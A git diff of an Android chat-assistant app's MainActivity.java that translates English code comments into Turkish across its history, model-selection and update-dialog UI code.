         iconFrameParams.gravity = android.view.Gravity.CENTER_HORIZONTAL;
         iconFrameParams.setMargins(0, 0, 0, 24);
         iconFrame.setLayoutParams(iconFrameParams);
         
-        // İkon arka plan (gradient circle)
+        // İkon arka plan (radyal daire)
         View iconBg = new View(this);
         android.widget.FrameLayout.LayoutParams iconBgParams = new android.widget.FrameLayout.LayoutParams(80, 80);
         iconBg.setLayoutParams(iconBgParams);
@@ -4308,7 +4312,7 @@ public class MainActivity extends Activity {
         iconBg.setBackground(iconBgDrawable);
         iconFrame.addView(iconBg);
         
-        // İkon (trash/delete)
+        // İkon (çöp kutusu/sil)
         TextView iconText = new TextView(this);
         iconText.setText("🗑️");
         iconText.setTextSize(32);
@@ -4407,7 +4411,7 @@ public class MainActivity extends Activity {
         txtWarning.setLayoutParams(warnParams);
         mainLayout.addView(txtWarning);
 
-        // Buton container
+        // Buton kapsayıcısı
         LinearLayout buttonLayout = new LinearLayout(this);
         buttonLayout.setOrientation(LinearLayout.HORIZONTAL);
         buttonLayout.setGravity(android.view.Gravity.CENTER);
@@ -4515,7 +4519,7 @@ public class MainActivity extends Activity {
             .setInterpolator(new android.view.animation.OvershootInterpolator(1.1f))
             .start();
         
-        // İkon pulse animasyonu
+        // İkon nabız animasyonu
         android.animation.ObjectAnimator iconPulse = android.animation.ObjectAnimator.ofFloat(
             iconBg, "scaleX", 1f, 1.1f, 1f);
         android.animation.ObjectAnimator iconPulseY = android.animation.ObjectAnimator.ofFloat(
@@ -4529,7 +4533,7 @@ public class MainActivity extends Activity {
     }
 
     /**
-     * Premium "Tümünü Temizle" onay dialogu.
+     * Premium "Tümünü Temizle" onay iletişim kutusu.
      * Tüm sohbet geçmişini silmek için kullanılır.
      */
     private void showPremiumClearAllDialog(int totalCount, Runnable onConfirm) {
@@ -4538,7 +4542,7 @@ public class MainActivity extends Activity {
         mainLayout.setOrientation(LinearLayout.VERTICAL);
         mainLayout.setPadding(48, 40, 48, 32);
         
-        // Premium glassmorphism arka plan (daha koyu ve tehlikeli görünüm)
+        // Premium buzlu cam (glassmorphism) arka plan (daha koyu ve tehlikeli görünüm)
         android.graphics.drawable.GradientDrawable bgGradient = new android.graphics.drawable.GradientDrawable();
         bgGradient.setShape(android.graphics.drawable.GradientDrawable.RECTANGLE);
         bgGradient.setCornerRadius(32);
@@ -4551,14 +4555,14 @@ public class MainActivity extends Activity {
         mainLayout.setBackground(bgGradient);
         mainLayout.setElevation(28);
 
-        // İkon container (Animated warning - daha büyük)
+        // İkon kapsayıcısı (Animasyonlu uyarı - daha büyük)
         android.widget.FrameLayout iconFrame = new android.widget.FrameLayout(this);
         LinearLayout.LayoutParams iconFrameParams = new LinearLayout.LayoutParams(96, 96);
         iconFrameParams.gravity = android.view.Gravity.CENTER_HORIZONTAL;
         iconFrameParams.setMargins(0, 0, 0, 24);
         iconFrame.setLayoutParams(iconFrameParams);
         
-        // İkon arka plan (gradient circle - daha parlak kırmızı)
+        // İkon arka plan (radyal daire - daha parlak kırmızı)
         View iconBg = new View(this);
         android.widget.FrameLayout.LayoutParams iconBgParams = new android.widget.FrameLayout.LayoutParams(96, 96);
         iconBg.setLayoutParams(iconBgParams);
@@ -4571,7 +4575,7 @@ public class MainActivity extends Activity {
         iconBg.setBackground(iconBgDrawable);
         iconFrame.addView(iconBg);
         
-        // İkon (warning symbol)
+        // İkon (uyarı sembolü)
         TextView iconText = new TextView(this);
         iconText.setText("⚠️");
         iconText.setTextSize(40);
@@ -4697,7 +4701,7 @@ public class MainActivity extends Activity {
         spacer.setLayoutParams(spacerParams);
         mainLayout.addView(spacer);
 
-        // Buton container
+        // Buton kapsayıcısı
         LinearLayout buttonLayout = new LinearLayout(this);
         buttonLayout.setOrientation(LinearLayout.HORIZONTAL);
         buttonLayout.setGravity(android.view.Gravity.CENTER);
@@ -4772,7 +4776,7 @@ public class MainActivity extends Activity {
         });
         
         btnDelete.setOnClickListener(v -> {
-            // Çift vibrasyon (tehlike uyarısı)
+            // Çift titreşim (tehlike uyarısı)
             vibrateFeedback();
             new android.os.Handler(Looper.getMainLooper()).postDelayed(() -> vibrateFeedback(), 100);
             
@@ -4821,7 +4825,7 @@ public class MainActivity extends Activity {
             .setInterpolator(new android.view.animation.OvershootInterpolator(1.2f))
             .start();
         
-        // İkon pulse animasyonu (daha hızlı ve belirgin)
+        // İkon nabız animasyonu (daha hızlı ve belirgin)
         android.animation.ObjectAnimator iconPulse = android.animation.ObjectAnimator.ofFloat(
             iconBg, "scaleX", 1f, 1.15f, 1f);
         android.animation.ObjectAnimator iconPulseY = android.animation.ObjectAnimator.ofFloat(
@@ -4833,7 +4837,7 @@ public class MainActivity extends Activity {
         iconPulse.start();
         iconPulseY.start();
         
-        // Sayı pulse animasyonu
+        // Sayı nabız animasyonu
         android.animation.ObjectAnimator countPulse = android.animation.ObjectAnimator.ofFloat(
             statsCount, "scaleX", 1f, 1.05f, 1f);
         android.animation.ObjectAnimator countPulseY = android.animation.ObjectAnimator.ofFloat(
@@ -4938,7 +4942,7 @@ public class MainActivity extends Activity {
                         } catch (Exception ignored) {}
                     }
                     
-                    // Stats kartlarını güncelle
+                    // İstatistik kartlarını güncelle
                     final int finalTodayCount = todayCount;
                     final int finalThisWeekCount = thisWeekCount;
                     runOnUiThread(() -> {
@@ -4949,7 +4953,7 @@ public class MainActivity extends Activity {
 
                     if (historyArray.length() == 0) {
                         runOnUiThread(() -> {
-                            // Yeni dedicated boş durum görünümünü göster
+                            // Yeni özel boş durum görünümünü göster
                             if (layoutHistoryEmpty != null) {
                                 layoutHistoryEmpty.setVisibility(View.VISIBLE);
                             }
@@ -4973,7 +4977,7 @@ public class MainActivity extends Activity {
                         String time = entry.optString("time", "--:--");
                         String currentDate = entry.optString("date", "");
 
-                        // Bir sonraki mesajı kontrol et (Pairing Logic)
+                        // Bir sonraki mesajı kontrol et (Eşleşme Mantığı)
                         JSONObject nextEntry = null;
                         if (i + 1 < historyArray.length()) {
                             nextEntry = historyArray.getJSONObject(i + 1);
@@ -5002,13 +5006,13 @@ public class MainActivity extends Activity {
                             }
 
                             if (!matchFound) {
-                                if (isPair) i++; // Çifti komple atla
+                                if (isPair) i++; // Çifti tamamen atla
                                 continue;
                             }
                         }
 
                         visibleCount++;
-                        final int index = i; // Soru indeksi (silme işlemi için referans)
+                        final int index = i; // Soru dizini (silme işlemi için referans)
                         final String filterText = finalFilter;
                         
                         // Tarih başlığı
@@ -5117,20 +5121,20 @@ public class MainActivity extends Activity {
     }
 
     /**
-     * Tarih başlığı ekler (örn: "05/01/2026") - Premium neon badge tasarımı
+     * Tarih başlığı ekler (örn: "05/01/2026") - Premium neon rozet tasarımı
      */
     private void addDateHeaderUI(String date) {
         LinearLayout.LayoutParams wrapperParams = new LinearLayout.LayoutParams(
                 ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT);
         wrapperParams.setMargins(0, 24, 0, 16);
 
-        // Wrapper layout (ortalama için)
+        // Sarıcı düzen (ortalama için)
         LinearLayout wrapper = new LinearLayout(this);
         wrapper.setLayoutParams(wrapperParams);
         wrapper.setGravity(android.view.Gravity.CENTER);
         wrapper.setOrientation(LinearLayout.HORIZONTAL);
 
-        // Badge container
+        // Rozet kapsayıcısı
         TextView dateHeader = new TextView(this);
         dateHeader.setText(formatDateHeader(date));
         dateHeader.setTextColor(Color.parseColor("#00FBFF"));
@@ -5258,7 +5262,7 @@ public class MainActivity extends Activity {
     }
 
     /**
-     * Soru ve Cevabı tek bir kart (Interaction Pair) olarak ekler.
+     * Soru ve Cevabı tek bir kart (Etkileşim Çifti) olarak ekler.
      */
     private void addHistoryPairToUI(JSONObject userEntry, JSONObject aiEntry, String time, int index, String filter) {
         try {
@@ -5277,7 +5281,7 @@ public class MainActivity extends Activity {
             itemLayout.setClickable(true);
             itemLayout.setFocusable(true);
 
-            // Tıklayınca AI cevabını kopyala
+            // Tıklayınca YZ cevabını kopyala
             itemLayout.setOnClickListener(v -> {
                 ClipboardManager clipboard = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
                 ClipData clip = ClipData.newPlainText("niko_reply", aiMsg);
@@ -5286,10 +5290,10 @@ public class MainActivity extends Activity {
                 Toast.makeText(this, "Niko'nun cevabı kopyalandı", Toast.LENGTH_SHORT).show();
             });
 
-            // Uzun basınca sil (Index sorunun indeksidir, silme mantığı ikisini de silmeli mi?
+            // Uzun basınca sil (Dizin sorunun dizinidir, silme mantığı ikisini de silmeli mi?
             // deleteSingleHistoryItem sadece bir item siliyor.
             // Eğer çifti silmek istiyorsak, ardışık iki item silmeliyiz.
-            // Bu yüzden custom bir silme mantığı gerekebilir veya kullanıcıya sorulabilir.
+            // Bu yüzden özel bir silme mantığı gerekebilir veya kullanıcıya sorulabilir.
             // Şimdilik sadece soruyu (ve dolayısıyla kaymayı) tetikleyeceği için dikkatli olunmalı.
             // En iyisi tek tek silmek yerine "Bu konuşmayı sil" demek.
             itemLayout.setOnLongClickListener(v -> {
@@ -5304,7 +5308,7 @@ public class MainActivity extends Activity {
                     
                     final String finalPreview = previewText;
                     
-                    // Premium dialog göster
+                    // Premium iletişim kutusu göster
                     showPremiumDeleteDialog(
                         "Anıyı Sil",
                         "Bu konuşma geçmişten silinsin mi?",
@@ -5312,14 +5316,14 @@ public class MainActivity extends Activity {
                         () -> deleteHistoryPair(index)
                     );
                 } catch (Exception e) {
-                    // Hata durumunda basit dialog
+                    // Hata durumunda basit iletişim kutusu
                     deleteHistoryPair(index);
                 }
                 
                 return true;
             });
 
-            // HEADER: Zaman Damgası (Sağ Üst)
+            // BAŞLIK: Zaman Damgası (Sağ Üst)
             RelativeLayout header = new RelativeLayout(this);
             header.setLayoutParams(new LinearLayout.LayoutParams(
                     ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT));
@@ -5373,7 +5377,7 @@ public class MainActivity extends Activity {
                     ViewGroup.LayoutParams.MATCH_PARENT, 1); // 1px yükseklik
             dividerParams.setMargins(0, 24, 0, 24);
             divider.setLayoutParams(dividerParams);
-            divider.setBackgroundColor(Color.parseColor("#1AFFFFFF")); // %10 opacity beyaz
+            divider.setBackgroundColor(Color.parseColor("#1AFFFFFF")); // %10 opaklık beyaz
             itemLayout.addView(divider);
 
             // 2. BÖLÜM: NIKO (CEVAP)
@@ -5418,7 +5422,7 @@ public class MainActivity extends Activity {
      * Soru-Cevap çiftini siler (İki kayıt birden).
      */
     private void deleteHistoryPair(int index) {
-        // Silme işlemi (dialog zaten long click'te gösterildi)
+        // Silme işlemi (iletişim kutusu zaten uzun tıklamada gösterildi)
         new Thread(() -> {
             synchronized (historyLock) {
                 try {
@@ -5521,7 +5525,7 @@ public class MainActivity extends Activity {
     }
 
     /**
-     * Tüm geçmişi siler. (Thread-safe ve Gelişmiş UI Geri Bildirimi)
+     * Tüm geçmişi siler. (İş parçacığı güvenli ve Gelişmiş Arayüz Geri Bildirimi)
      */
     private void clearHistory() {
         // Zaten boşsa işlem yapma
@@ -5532,7 +5536,7 @@ public class MainActivity extends Activity {
 
         int totalCount = getHistoryCount();
         
-        // Premium dialog göster
+        // Premium iletişim kutusu göster
         showPremiumClearAllDialog(totalCount, () -> {
             // Veri güvenliği için kilitleme kullan
             synchronized (historyLock) {
@@ -5546,7 +5550,7 @@ public class MainActivity extends Activity {
                 if (layoutHistoryEmpty != null) {
                     layoutHistoryEmpty.setVisibility(View.VISIBLE);
                 }
-                // Stats kartlarını sıfırla
+                // İstatistik kartlarını sıfırla
                 if (txtStatTotalChats != null) txtStatTotalChats.setText("0");
                 if (txtStatThisWeek != null) txtStatThisWeek.setText("0");
                 if (txtStatToday != null) txtStatToday.setText("0");
@@ -5619,7 +5623,7 @@ public class MainActivity extends Activity {
         }).start();
     }
 
-    // ================= MODEL SEÇİMİ (MODEL SELECTION) =================
+    // ================= MODEL SEÇİMİ =================
     
     /**
      * Model panelinin açılış animasyonu.
@@ -5628,7 +5632,7 @@ public class MainActivity extends Activity {
         layoutModels.setAlpha(0f);
         layoutModels.setScaleY(0.9f);
         
-        // Yukarıdan aşağı slide + fade
+        // Yukarıdan aşağı kaydırma + geçiş
         layoutModels.animate()
             .alpha(1f)
             .scaleY(1f)
@@ -5724,8 +5728,8 @@ public class MainActivity extends Activity {
     }
     
     /**
-     * Seçili model için glow animasyonu.
-     * Optimize edilmiş - Tek animator, düşük CPU.
+     * Seçili model için parlama animasyonu.
+     * Optimize edildi - Tek animatör, düşük İşlemci.
      */
     private void animateSelectedModelGlow(View modelCard) {
         if (modelCard == null) return;
@@ -5750,7 +5754,7 @@ public class MainActivity extends Activity {
     private void animateModelChangeSuccess() {
         if (txtCurrentModel == null) return;
         
-        // Başlık için success animasyonu
+        // Başlık için başarı animasyonu
         int originalColor = Color.WHITE;
         int successColor = Color.parseColor("#4CAF50");
         
@@ -5764,7 +5768,7 @@ public class MainActivity extends Activity {
         });
         colorAnim.start();
         
-        // Scale pulse
+        // Ölçek nabzı
         txtCurrentModel.animate()
             .scaleX(1.1f)
             .scaleY(1.1f)
@@ -5799,7 +5803,7 @@ public class MainActivity extends Activity {
     
     /**
      * Model değişikliği için hafif konfeti efekti.
-     * Optimize edilmiş - Daha az parçacık, hardware acceleration.
+     * Optimize edildi - Daha az parçacık, donanım hızlandırma.
      */
     private void animateModelChangeConfetti() {
         if (layoutModels == null || !(layoutModels instanceof android.view.ViewGroup)) return;
@@ -5861,7 +5865,7 @@ public class MainActivity extends Activity {
     }
 
     /**
-     * Model seçim panelini ekrandan yavaşça (fade-out) gizler.
+     * Model seçim panelini ekrandan yavaşça (solarak) gizler.
      */
     private void hideModels() {
         runOnUiThread(() -> {
@@ -5895,7 +5899,7 @@ public class MainActivity extends Activity {
                     runOnUiThread(() -> {
                         containerModelItems.removeAllViews();
                         
-                        // Modelleri sırayla ekle (stagger effect için)
+                        // Modelleri sırayla ekle (kademeli etki için)
                         for (int i = 0; i < models.length(); i++) {
                             try {
                                 String modelName = models.getString(i);
@@ -5961,7 +5965,7 @@ public class MainActivity extends Activity {
             name = name.substring(name.lastIndexOf("/") + 1);
         }
 
-        // Gereksiz tagları temizle
+        // Gereksiz etiketleri temizle
         name = name.replace(":latest", "");
 
         // Versiyon bilgisini parantez içine al (örn: llama3:8b -> Llama3 (8B))
@@ -6025,7 +6029,7 @@ public class MainActivity extends Activity {
         itemLayout.setClickable(true);
         itemLayout.setFocusable(true);
 
-        // Model İsmi (Başlık)
+        // Model Adı (Başlık)
         TextView txtTitle = new TextView(this);
         txtTitle.setText(formatModelName(modelName));
         txtTitle.setTextColor(Color.WHITE);
@@ -6050,7 +6054,7 @@ public class MainActivity extends Activity {
             txtTitle.setCompoundDrawablesWithIntrinsicBounds(0, 0, android.R.drawable.checkbox_on_background, 0);
             txtTitle.setCompoundDrawablePadding(16);
             
-            // Seçili öğeye özel glow animasyonu
+            // Seçili öğeye özel parlama animasyonu
             animateSelectedModelGlow(itemLayout);
         }
 
@@ -6151,13 +6155,13 @@ public class MainActivity extends Activity {
     }
 
     /**
-     * GitHub üzerindeki README dosyasından güncel API URL'sini çeker ve günceller.
-     * Bu sayede backend tünel adresi değişse bile uygulama otomatik ayak uydurur.
+     * GitHub üzerindeki BENİOKU (README) dosyasından güncel API adresini (URL) çeker ve günceller.
+     * Bu sayede sunucu tünel adresi değişse bile uygulama otomatik ayak uydurur.
      */
     private void updateApiUrlFromGithub() {
         new Thread(() -> {
             try {
-                // GitHub üzerinden README dosyasının ham halini al
+                // GitHub üzerinden BENİOKU (README) dosyasının ham halini al
                 URL url = new URL("https://raw.githubusercontent.com/Memati8383/niko-with-kiro/main/README.md");
                 HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                 conn.setRequestMethod("GET");
@@ -6173,7 +6177,7 @@ public class MainActivity extends Activity {
                 reader.close();
 
                 String content = sb.toString();
-                // Regex: Güncel Tünel/API Adresi satırındaki parantez içindeki URL'yi bulur
+                // Regex: Güncel Tünel/API Adresi satırındaki parantez içindeki adresi (URL) bulur
                 Pattern pattern = Pattern.compile("Güncel (?:Tünel|API) Adresi:.*?\\((https?://[^\\)]+)\\)");
                 Matcher matcher = pattern.matcher(content);
                 
@@ -6187,7 +6191,7 @@ public class MainActivity extends Activity {
                     API_BASE_URL = fetchedUrl;
                     addLog("[CONFIG] API URL güncellendi (GitHub): " + fetchedUrl);
                     
-                    // Local belleğe kaydet ki bir sonraki açılışta internet olmasa da en son adresi bilsin
+                    // Yerel belleğe kaydet ki bir sonraki açılışta internet olmasa da en son adresi bilsin
                     getSharedPreferences("app_settings", MODE_PRIVATE)
                             .edit()
                             .putString("api_url", fetchedUrl)
@@ -6245,7 +6249,7 @@ public class MainActivity extends Activity {
                     return;
                 }
 
-                // 2. Güncelleme varsa, GitHub Releases API'den detayları çek
+                // 2. Güncelleme varsa, GitHub Sürümler (Releases) API'sinden detayları çek
                 addLog("[UPDATE] Yeni sürüm bulundu, detaylar çekiliyor...");
                 fetchReleaseDetails();
 
@@ -6257,8 +6261,8 @@ public class MainActivity extends Activity {
     }
 
     /**
-     * GitHub Releases API'den güncelleme detaylarını çeker.
-     * description, changelog ve APK boyutunu otomatik alır.
+     * GitHub Sürümler (Releases) API'sinden güncelleme detaylarını çeker.
+     * Açıklama, değişiklik listesi ve APK boyutunu otomatik alır.
      */
     private void fetchReleaseDetails() {
         try {
@@ -6287,20 +6291,20 @@ public class MainActivity extends Activity {
 
             JSONObject releaseInfo = new JSONObject(releaseSb.toString());
 
-            // Release başlığı ve açıklaması
+            // Sürüm başlığı ve açıklaması
             String releaseName = releaseInfo.optString("name", "");
             String releaseBody = releaseInfo.optString("body", "");
 
             // Markdown işaretlerini temizle
             releaseBody = cleanMarkdown(releaseBody);
 
-            // İlk satırı description olarak kullan, geri kalanı changelog
+            // İlk satırı açıklama olarak kullan, geri kalanı değişiklik listesi (changelog)
             if (!releaseBody.isEmpty()) {
                 String[] bodyParts = releaseBody.split("\n", 2);
                 updateDescription = bodyParts[0].trim();
                 if (bodyParts.length > 1) {
                     String rawChangelog = bodyParts[1].trim();
-                    // Changelog'u maksimum 500 karakterle sınırla
+                    // Değişiklik listesini en fazla 500 karakterle sınırla
                     if (rawChangelog.length() > 500) {
                         rawChangelog = rawChangelog.substring(0, 497) + "...";
                     }
@@ -6317,7 +6321,7 @@ public class MainActivity extends Activity {
             }
 
 
-            // APK dosyasının boyutunu bul (assets içinden)
+            // APK dosyasının boyutunu bul (kaynaklar içinden)
             updateFileSize = 0;
             JSONArray assets = releaseInfo.optJSONArray("assets");
             if (assets != null) {
@@ -6337,7 +6341,7 @@ public class MainActivity extends Activity {
 
         } catch (Exception e) {
             addLog("[UPDATE] Release detayları alınamadı: " + e.getMessage());
-            // Hata olsa bile varsayılan değerlerle dialog göster
+            // Hata olsa bile varsayılan değerlerle iletişim kutusu göster
             updateDescription = "Yeni sürüm mevcut: " + latestVersion;
             updateChangelog = "";
             updateFileSize = 0;
@@ -6347,7 +6351,7 @@ public class MainActivity extends Activity {
 
     /**
      * Markdown işaretlerini temizler.
-     * Başlıklar, linkler, bold/italic gibi formatları kaldırır.
+     * Başlıklar, bağlantılar, kalın/italik gibi biçimlendirmeleri kaldırır.
      */
     private String cleanMarkdown(String text) {
         if (text == null || text.isEmpty()) return "";
@@ -6357,13 +6361,13 @@ public class MainActivity extends Activity {
         // Başlıkları temizle (# ## ### vb.)
         cleaned = cleaned.replaceAll("(?m)^#+\\s*", "");
         
-        // Bold ve italic işaretlerini temizle (**text** veya *text* veya __text__ veya _text_)
+        // Kalın ve italik işaretlerini temizle
         cleaned = cleaned.replaceAll("\\*\\*(.+?)\\*\\*", "$1");
         cleaned = cleaned.replaceAll("\\*(.+?)\\*", "$1");
         cleaned = cleaned.replaceAll("__(.+?)__", "$1");
         cleaned = cleaned.replaceAll("_(.+?)_", "$1");
         
-        // Linkleri temizle [text](url) -> text
+        // Bağlantıları temizle
         cleaned = cleaned.replaceAll("\\[(.+?)\\]\\(.+?\\)", "$1");
         
         // Kod bloklarını temizle
@@ -6413,23 +6417,23 @@ public class MainActivity extends Activity {
     }
 
     /**
-     * Premium tasarımlı güncelleme dialogu.
-     * Modern, glassmorphism tarzı, animasyonlu.
-     * Ultra premium tasarım: pulse animasyonlar, gradient efektler, gölgeler.
+     * Premium tasarımlı güncelleme iletişim kutusu.
+     * Modern, buzlu cam (glassmorphism) tarzı, animasyonlu.
+     * Ultra premium tasarım: nabız animasyonları, gradyan (geçişli) efektler, gölgeler.
      */
     private void showPremiumUpdateDialog() {
         String skipped = updatePrefs.getString("skipped_version", "");
         if (skipped.equals(latestVersion)) {
-            addLog("[UPDATE] Sürüm " + latestVersion + " atlanmış, dialog gösterilmiyor.");
+            addLog("[UPDATE] Sürüm " + latestVersion + " atlanmış, iletişim kutusu gösterilmiyor.");
             return;
         }
 
-        // Dialog oluştur
+        // İletişim kutusu oluştur
         updateDialog = new android.app.Dialog(this, android.R.style.Theme_DeviceDefault_Dialog_NoActionBar);
         updateDialog.setCancelable(true);
         updateDialog.setCanceledOnTouchOutside(true);
 
-        // ScrollView wrapper (uzun changelog için)
+        // KaydırmaGörünümü sarıcısı (uzun değişiklik listesi için)
         android.widget.ScrollView scrollView = new android.widget.ScrollView(this);
         scrollView.setVerticalScrollBarEnabled(false);
         scrollView.setOverScrollMode(View.OVER_SCROLL_NEVER);
@@ -6439,7 +6443,7 @@ public class MainActivity extends Activity {
         mainLayout.setOrientation(LinearLayout.VERTICAL);
         mainLayout.setPadding(56, 48, 56, 40);
         
-        // Premium Glassmorphism arka plan
+        // Premium Buzlu Cam (Glassmorphism) arka plan
         android.graphics.drawable.GradientDrawable bgGradient = new android.graphics.drawable.GradientDrawable();
         bgGradient.setShape(android.graphics.drawable.GradientDrawable.RECTANGLE);
         bgGradient.setCornerRadius(40);
@@ -6455,7 +6459,7 @@ public class MainActivity extends Activity {
         // Elevation efekti
         mainLayout.setElevation(32);
 
-        // ===== HEADER BÖLÜMÜ =====
+        // ===== BAŞLIK BÖLÜMÜ =====
         android.widget.FrameLayout headerFrame = new android.widget.FrameLayout(this);
         LinearLayout.LayoutParams headerFrameParams = new LinearLayout.LayoutParams(
             LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
@@ -6466,13 +6470,13 @@ public class MainActivity extends Activity {
         headerLayout.setOrientation(LinearLayout.HORIZONTAL);
         headerLayout.setGravity(android.view.Gravity.CENTER_VERTICAL);
 
-        // Premium İkon Container (Pulse & Glow efekti)
+        // Premium İkon Kapsayıcısı (Nabız ve Parlama efekti)
         android.widget.FrameLayout iconContainer = new android.widget.FrameLayout(this);
         LinearLayout.LayoutParams iconContainerParams = new LinearLayout.LayoutParams(80, 80);
         iconContainerParams.setMargins(0, 0, 24, 0);
         iconContainer.setLayoutParams(iconContainerParams);
 
-        // Dış glow katmanı (pulse animasyonu için)
+        // Dış parlama katmanı (nabız animasyonu için)
         View glowRing = new View(this);
         android.widget.FrameLayout.LayoutParams glowParams = new android.widget.FrameLayout.LayoutParams(80, 80);
         glowRing.setLayoutParams(glowParams);
@@ -6483,7 +6487,7 @@ public class MainActivity extends Activity {
         glowRing.setBackground(glowDrawable);
         iconContainer.addView(glowRing);
 
-        // Pulse animasyonu
+        // Nabız animasyonu
         android.animation.ObjectAnimator pulseAnimator = android.animation.ObjectAnimator.ofFloat(glowRing, "alpha", 1f, 0.3f, 1f);
         pulseAnimator.setDuration(2000);
         pulseAnimator.setRepeatCount(android.animation.ObjectAnimator.INFINITE);
@@ -6498,7 +6502,7 @@ public class MainActivity extends Activity {
         scaleX.start();
         scaleY.start();
 
-        // Ana ikon (gradient daire + ok simgesi)
+        // Ana ikon (gradyan daire + ok simgesi)
         TextView iconView = new TextView(this);
         android.widget.FrameLayout.LayoutParams iconViewParams = new android.widget.FrameLayout.LayoutParams(64, 64);
         iconViewParams.gravity = android.view.Gravity.CENTER;
@@ -6516,7 +6520,7 @@ public class MainActivity extends Activity {
         iconView.setElevation(8);
         iconContainer.addView(iconView);
 
-        // Bounce animasyonu (ikon için)
+        // Zıplama animasyonu (ikon için)
         android.animation.ObjectAnimator bounceAnim = android.animation.ObjectAnimator.ofFloat(iconView, "translationY", 0f, -8f, 0f);
         bounceAnim.setDuration(1500);
         bounceAnim.setRepeatCount(android.animation.ObjectAnimator.INFINITE);
@@ -6562,7 +6566,7 @@ public class MainActivity extends Activity {
         versionCompare.setLayoutParams(versionCompareParams);
         versionCompare.setPadding(20, 16, 20, 16);
         
-        // Version chip arka planı
+        // Sürüm çipi arka planı
         android.graphics.drawable.GradientDrawable versionChipBg = new android.graphics.drawable.GradientDrawable();
         versionChipBg.setShape(android.graphics.drawable.GradientDrawable.RECTANGLE);
         versionChipBg.setCornerRadius(16);
@@ -6594,7 +6598,7 @@ public class MainActivity extends Activity {
 
         mainLayout.addView(versionCompare);
 
-        // ===== AYIRICI ÇİZGİ (gradient) =====
+        // ===== AYIRICI ÇİZGİ (gradyan) =====
         View divider1 = new View(this);
         LinearLayout.LayoutParams dividerParams = new LinearLayout.LayoutParams(
             LinearLayout.LayoutParams.MATCH_PARENT, 2);
@@ -6617,9 +6621,9 @@ public class MainActivity extends Activity {
         txtDesc.setTypeface(android.graphics.Typeface.create("sans-serif", android.graphics.Typeface.NORMAL));
         mainLayout.addView(txtDesc);
 
-        // ===== CHANGELOG BÖLÜMÜ (varsa) =====
+        // ===== DEĞİŞİKLİK LİSTESİ BÖLÜMÜ (varsa) =====
         if (updateChangelog != null && !updateChangelog.isEmpty()) {
-            // Ana Changelog container
+            // Ana Değişiklik Listesi kapsayıcısı
             LinearLayout changelogContainer = new LinearLayout(this);
             changelogContainer.setOrientation(LinearLayout.VERTICAL);
             LinearLayout.LayoutParams changelogParams = new LinearLayout.LayoutParams(
@@ -6633,7 +6637,7 @@ public class MainActivity extends Activity {
             changelogHeader.setGravity(android.view.Gravity.CENTER_VERTICAL);
             changelogHeader.setPadding(0, 0, 0, 16);
 
-            // Başlık ikonu için container (gradient arka plan)
+            // Başlık ikonu için kapsayıcı (gradyan arka plan)
             android.widget.FrameLayout iconFrame = new android.widget.FrameLayout(this);
             LinearLayout.LayoutParams iconFrameParams = new LinearLayout.LayoutParams(36, 36);
             iconFrameParams.setMargins(0, 0, 14, 0);
@@ -6678,7 +6682,7 @@ public class MainActivity extends Activity {
             changelogHeader.addView(titleBlock);
             changelogContainer.addView(changelogHeader);
 
-            // Değişiklik öğelerini parse et ve her biri için premium kart oluştur
+            // Değişiklik öğelerini ayrıştır ve her biri için premium kart oluştur
             String[] changelogLines = updateChangelog.split("\n");
             int itemIndex = 0;
             
@@ -6696,7 +6700,7 @@ public class MainActivity extends Activity {
                 itemCard.setLayoutParams(itemParams);
                 itemCard.setPadding(16, 14, 16, 14);
                 
-                // Kart arka planı (glassmorphism)
+                // Kart arka planı (buzlu cam efekti)
                 android.graphics.drawable.GradientDrawable cardBg = new android.graphics.drawable.GradientDrawable();
                 cardBg.setShape(android.graphics.drawable.GradientDrawable.RECTANGLE);
                 cardBg.setCornerRadius(14);
@@ -6730,7 +6734,7 @@ public class MainActivity extends Activity {
                 String displayText = trimmedLine;
                 String emoji = "";
                 
-                // Başındaki bullet point veya tire kaldır
+                // Başındaki madde işareti veya tireyi kaldır
                 if (displayText.startsWith("•") || displayText.startsWith("-") || displayText.startsWith("*")) {
                     displayText = displayText.substring(1).trim();
                 }
@@ -6794,7 +6798,7 @@ public class MainActivity extends Activity {
                 itemCard.addView(contentArea);
                 changelogContainer.addView(itemCard);
 
-                // Stagger animasyonu
+                // Kademeli animasyon
                 final int delay = itemIndex * 80;
                 itemCard.setAlpha(0f);
                 itemCard.setTranslationX(30);
@@ -6846,19 +6850,19 @@ public class MainActivity extends Activity {
             mainLayout.addView(sizeContainer);
         }
 
-        // ===== PROGRESS BAR ALANI (başlangıçta gizli) =====
+        // ===== İLERLEME ÇUBUĞU ALANI (başlangıçta gizli) =====
         LinearLayout progressLayout = new LinearLayout(this);
         progressLayout.setOrientation(LinearLayout.VERTICAL);
         progressLayout.setVisibility(View.GONE);
         progressLayout.setPadding(8, 24, 8, 24);
 
-        // Premium progress bar container
+        // Premium ilerleme çubuğu kapsayıcısı
         android.widget.FrameLayout progressContainer = new android.widget.FrameLayout(this);
         LinearLayout.LayoutParams progressContainerParams = new LinearLayout.LayoutParams(
             LinearLayout.LayoutParams.MATCH_PARENT, 16);
         progressContainer.setLayoutParams(progressContainerParams);
 
-        // Progress arka planı
+        // İlerleme arka planı
         View progressBg = new View(this);
         android.widget.FrameLayout.LayoutParams progressBgParams = new android.widget.FrameLayout.LayoutParams(
             android.widget.FrameLayout.LayoutParams.MATCH_PARENT, 16);
@@ -6870,7 +6874,7 @@ public class MainActivity extends Activity {
         progressBg.setBackground(progressBgDrawable);
         progressContainer.addView(progressBg);
 
-        // Progress bar
+        // İlerleme çubuğu
         updateProgressBar = new android.widget.ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal);
         updateProgressBar.setMax(100);
         updateProgressBar.setProgress(0);
@@ -6878,7 +6882,7 @@ public class MainActivity extends Activity {
             android.widget.FrameLayout.LayoutParams.MATCH_PARENT, 16);
         updateProgressBar.setLayoutParams(progressBarParams);
         
-        // Gradient progress drawable
+        // Gradyan ilerleme çizimi
         android.graphics.drawable.LayerDrawable progressDrawable = (android.graphics.drawable.LayerDrawable) updateProgressBar.getProgressDrawable();
         progressDrawable.getDrawable(1).setColorFilter(Color.parseColor("#00E5FF"), android.graphics.PorterDuff.Mode.SRC_IN);
         
@@ -6886,7 +6890,7 @@ public class MainActivity extends Activity {
         progressContainer.addView(updateProgressBar);
